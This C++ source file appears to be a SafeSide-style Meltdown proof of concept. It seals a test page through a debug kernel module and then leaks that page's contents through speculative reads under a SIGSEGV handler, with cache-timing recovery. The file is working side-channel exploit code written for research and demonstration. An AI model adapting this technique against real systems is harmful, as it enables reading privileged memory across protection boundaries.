#include <setjmp.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>

#include <iomanip>
#include <iostream>
#include <fstream>
#include <functional>

#include "timing_array.h"
#include "utils.h"

using FaultHandler = std::function<void(int, siginfo_t*, void*)>;
thread_local sigjmp_buf signal_handler_jmpbuf;
thread_local FaultHandler fault_handler;

const char kSealEndpoint[] =
  "/sys/kernel/debug/safeside_meltdown/address_to_seal";

void SignalHandler(int signal, siginfo_t *info, void *ucontext) {
  fault_handler(signal, info, ucontext);
  siglongjmp(signal_handler_jmpbuf, 1);
}

bool RunWithFaultHandler(std::function<void()> inner, FaultHandler handler) {
  bool handled_fault = true;

  fault_handler = handler;
  struct sigaction sa, oldsa;
  memset(&sa, 0, sizeof(sa));

  sa.sa_sigaction = SignalHandler;
  sigaction(SIGSEGV, &sa, &oldsa);

  if (sigsetjmp(signal_handler_jmpbuf, 1) == 0) {
    inner();
    handled_fault = false;
  }

  sigaction(SIGSEGV, &oldsa, nullptr);
  fault_handler = {};
  return handled_fault;
}

int Seal(void* address) {
  std::ofstream f(kSealEndpoint);
  if (!f) {
    std::cerr << "Couldn't open " << kSealEndpoint << std::endl;
    exit(1);
  }

  // Writes "0xABC" as the module expects.
  f << address << std::endl;

  return 0;
}

struct pointer_chase_t {
  pointer_chase_t *next;
  int data;
};

int main(int argc, char* argv[]) {
  pointer_chase_t *head = nullptr;
  for (int i = 0; i < 10; ++i) {
    auto *current = reinterpret_cast<pointer_chase_t*>(new char[2*kPageBytes]);
    current->next = head;
    current->data = i;
    head = current;
  }

  void* k = mmap(nullptr, kPageBytes, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
  if (k == MAP_FAILED) {
    exit(1);
  }

  std::cout << "Write" << std::endl;
  *(volatile int *)k = 7;

  std::cout << "Seal" << std::endl;
  Seal(k);

  TimingArray ta;

  std::cout << "Testing" << std::endl;

  for (int i = 0; i < 100000; ++i) {
    ta.FlushFromCache();
    auto *current = head;
    for (int j = 0; j < 10; ++j) {
      FlushFromDataCache(current, current+1);
      current = current->next;
    }

    bool saw_exception = RunWithFaultHandler([&ta, head, k]() {
      ForceRead(&head->next->next->next->next->next->next->data);
      ForceRead(&ta[*(volatile int*)k]);
    }, [&ta](int signal, siginfo_t *info, void *ucontext) {
      // std::cout << "saw signal " << signal << std::endl;
      int n = ta.FindFirstCachedElementIndex();
      if (n >= 0) {
        std::cout << "extracted " << n << std::endl;
      }
    });

    if (!saw_exception) {
      std::cerr << "how'd we get here?" << std::endl;
      exit(1);
    }
  }

  std::cout << "Done" << std::endl;

  return 0;
}


int main2(int argc, char* argv[]) {
  TimingArray ta;

  ta.FlushFromCache();
  RunWithFaultHandler([&ta]() {
    char* x = nullptr;
    *(volatile char *)x;

    ForceRead(&ta[5]);
  }, {});

  std::cout << ta.FindFirstCachedElementIndex() << std::endl;

  std::cout << "normal return" << std::endl;
  return 0;
}
